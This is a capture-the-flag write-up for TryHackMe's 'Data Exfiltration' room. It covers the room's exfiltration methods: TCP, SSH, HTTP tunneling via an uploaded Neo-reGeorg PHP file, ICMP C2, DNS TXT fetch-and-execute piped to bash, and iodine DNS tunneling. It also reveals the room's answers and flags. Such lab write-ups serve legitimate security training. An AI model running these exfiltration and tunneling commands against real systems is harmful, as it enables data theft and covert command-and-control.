![Data Exfiltration Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_Cover.png" alt="Data Exfiltration Logo">
</p>

# Data Exfiltration

This guide contains the answer and steps necessary to get to them for the [Data Exfiltration](https://tryhackme.com/r/room/dataxexfilt) room.

## Table of contents

- [Data Exfiltration](#data-exfiltration)
- [Exfiltration using TCP socket](#exfiltration-using-tcp-socket)
- [Exfiltration using SSH](#exfiltration-using-ssh)
- [Exfiltrate using HTTP(S)](#exfiltrate-using-http(s))
- [Exfiltration using ICMP](#exfiltration-using-icmp)
- [DNS Configurations](#dns-configurations)
- [Exfiltration over DNS](#exfiltration-over-dns)
- [DNS Tunneling](#dns-tunneling)

### Data Exfiltration

1. In which case scenario will sending and receiving traffic continue during the connection?

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>Tunneling</details>

2. In which case scenario will sending and receiving traffic be in one direction?

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>Traditional data exfiltration</details>

3. In the next task, we will be discussing how data exfiltration over the TCP socket works!

### Exfiltration using TCP socket

1. Exfiltration using TCP sockets relies on ____________ protocols!

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Non-standard</details>

2. Now apply what we discussed to exfiltrate data over the TCP socket! Once you exfiltrate data successfully, hitCompletedto move on to the next task!

   We need to ssh into the jump server and setup a listener that outputs the result to a file.

   ```console
   ssh thm@10.10.66.20
   nc -nlvp 1337 > /tmp/task4-creds.data
   ```

   Next we ssh into the victim1 machine through the jumpserver.

   ```console
   ssh thm@10.10.66.20
   ssh thm@victim1.thm.com
   ```

   ![TCP Listener](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_TCP_Listener.png)

   Next we compress and encode the data we want to exfiltrate in the 'task4' folder.

   ```console
   tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/1337
   ```

   This command will also send the data over the TCP socket.

   ![TCP Exfiltrate](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_TCP_Exfiltrate.png)

   Now that the files have been transfered to the jump server, we can decode en decompress the archive to get to the files.

   ```console
   dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar
   tar xvf task4-creds.tar
   ```

   ![TCP Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_TCP_Files.png)

### Exfiltration using SSH



1. All packets sent using the Data Exfiltration technique over SSH are encrypted! (T=True/F=False)

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>T</details>

2. Replicate the steps to transfer data over the SSH client. Once you transfer the file successfully, hitCompletedand move on to the next task!

   On victim 1 we can archive the folder and send it directly through the SSH client.

   ```console
   tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
   ```

   ![SSH Exfiltrate](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_SSH_Exfiltrate.png)

   ![SSH Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_SSH_Files.png)

### Exfiltrate using HTTP(S)

1. Check the Apache log file onweb.thm.comand get the flag!

   After ssh'ing into the web server through the jumpserver, we can look at the log file.

   ```console
   sudo cat /var/log/apache2/access.log
   ```

   ![HTTP Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Flag_1.png)

   This gives us the flag in base64 format. Decoding this gives us the flag.

   ```console
   echo VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= | base64 -d
   ```

   ![HTTP Flag 1 Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Flag_1_Decoded.png)

   ><details><summary>Click for answer</summary>THM{H77P-G37-15-f0un6}</details>

2. When you visit the http://flag.thm.com/flag website through the uploader machine via the HTTP tunneling technique, what is the flag?

   First thing to do to create our HTTP tunnel using `neo-regeorg` is to generate a key

   ```console
   python3 neoreg.py generate -k thm 
   ```

   ![HTTP Neo Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Neo_Key.png)

   Now we can upload the tunnel to the webserver at `http://10.10.230.138/uploader` with the key 'admin'.

   ![HTTP Upload Tunnel](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Upload_Tunnel.png)

   Next we can start the tunnel using the key and the URL to the uploaded file.

   ```console
   python3 neoreg.py -k thm -u http://10.10.230.138/uploader/files/tunnel.php
   ```
   
   ![HTTP Neo Tunnel](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Neo_Tunnel.png)

   When this is done we can use `curl` to tunnel to the flag server. The proxy is bound to our machine with `127.0.0.1:1080`.

   ```console
   curl --socks5 127.0.0.1:1080 http://172.20.0.120:80
   ```

   ![HTTP Get Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Get_Flag.png)

   This is not our flag. But it does point us to the correct page.

   ```console
   curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
   ```

   ![HTTP Flag 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_HTTP_Flag_2.png)

   ><details><summary>Click for answer</summary>THM{H77p_7unn3l1n9_l1k3_l337}</details>

### Exfiltration using ICMP

1. In which ICMP packet section can we include our data?

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>data</details>

2. Follow the technique discussed in this task to establish a C2 ICMP connection between JumpBox and ICMP-Host. Then execute the "getFlag" command. What is the flag?

   On the icmp server we initiate the `icmpdoor` binary and on the jump server we initiate the `icmp-cnc` binary.

   ```console
   sudo icmpdoor -i eth0 -d 192.168.0.133
   ```

   ```console
   sudo icmp-cnc -i eth1 -d 192.168.0.121
   ```

   Now that a connection has been established, we can send commands to the icmp server.

   ![Icmp Get Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_Icmp_Get_Flag.png)

   ><details><summary>Click for answer</summary>THM{g0t-1cmp-p4k3t!}</details>

### DNS Configurations

1. Once the DNS configuration works fine, resolve theflag.thm.comdomain name. What is the IP address?

   Simply using the command `dig +short flag.thm.com` should give us the ip of the flag server. 

   However, if we want to use the attack box itself, we must change its DNS settings. Edit the nameserver in the following file to `10.10.230.138`:

   ```console
   nano /etc/resolv.conf
   ```

   Now this command will also work from our attack box.

   ![DNS IP](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/dataxexfilt/Data_Exfiltration_DNS_IP.png)

   ><details><summary>Click for answer</summary>172.20.0.120</details>

### Exfiltration over DNS

1. What is the maximum length for the subdomain name (label)?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>63</details>

2. The Fully Qualified FQDN domain name must not exceed ______characters.

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>255</details>

3. Execute the C2 communication over the DNS protocol of the flag.tunnel.com. What is the flag?

   We need to replicate the command we just did to retrieve the contents of the TXT file for the `flag.tunnel.com` server.

   After uploading our script ins base64 format as a TXT entry, we retrieved the content of the TXT entry with:

   DNS EXFILTRATION TXT

   ```console
   dig +short -t TXT script.tunnel.com
   ```

   We named the TXT entry 'script' hence the subdomain.

   We can do the same but for the `flag.tunnel.com` TXT entry.

   ```console
   dig +short -t TXT flag.tunnel.com
   ```

   DNS EXFILTRATION BASE64

   We need to decode the string after removing the quotes.

   ```console
   dig +short -t TXT flag.tunnel.com | tr -d "\"" | base64 -d
   ```

   DNS EXFILTRATION CONTENTS

   This gives us a script to get our flag. We can execute it with:

   ```console
   dig +short -t TXT flag.tunnel.com | tr -d "\"" | base64 -d | bash
   ```

   DNS EXFILTRATION FLAG

   ><details><summary>Click for answer</summary>THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}</details>

### DNS Tunneling

1. When the iodine connection establishes to Attacker, run theifconfigcommand. How many interfaces are? (including the loopback interface)

   First we add the A and NS records to the DNS server to point to our attackbox.

   DSN TUNNEL A

   DNS TUNNEL NS

   Now that traffic pointed towards `t1.tunnel.com` will be directed to our machine, we can setup the iodine server on the attackbox.

   ```console
   sudo /sbin/iodined -f -c -P thmpass 10.1.1.1/24 t1.tunnel.com
   ```

   DNS TUNNEL SERVER

   Then we setup the client side on the jump machine.

   ```console
   sudo iodine -f -P thmpass t1.tunnel.com
   ```

   DNS TUNNEL CLIENT

   We can now check how many interfaces are active on the jump machine.

   DNS TUNNEL INTERFACES

   ><details><summary>Click for answer</summary>4</details>

2. What is the network interface name created by iodined?

   There is one interface that was added after establishing the connection and it is the top one in the previous image.

   ><details><summary>Click for answer</summary>dns0</details>

3. Use the DNS tunneling to prove your access to the webserver, http://192.168.0.100/test.php. What is the flag?

   Now that the DNS tunnel is in place we can connect to the jump box through the DNS tunnel via ssh.

   ```console
   ssh thm@10.1.1.2 -4 -N -f -D 1080
   ```

   This creates an ssh session with -D to enable the dynamic port forwarding feature to use the SSH session as a proxy using only IPv4 (-4).

   DNS TUNNEL SSH

   At first I thought something didn't work but later found out the the ssh session was backgrounded with the `-f` argument.

   Now we can use two methods to connect to the local machine. Curl or Proxychains. 

   Using curl can be done with the following command:

   ```console
   curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php
   ```

   DNS TUNNEL CURL FLAG

   For Proxychains we must first add the proxy to the config file.

   ```console
   nano /etc/proxychains4.conf

   # Add at the end
   socks5 127.0.0.1 1080
   ```

   Now we can also use Proxychains with:

   ```console
   proxychains curl http://192.168.0.100/test.php
   ```

   DNS TUNNEL PROXYCHAINS FLAG

   ><details><summary>Click for answer</summary>THM{DN5-Tunn311n9-1s-c00l}</details>

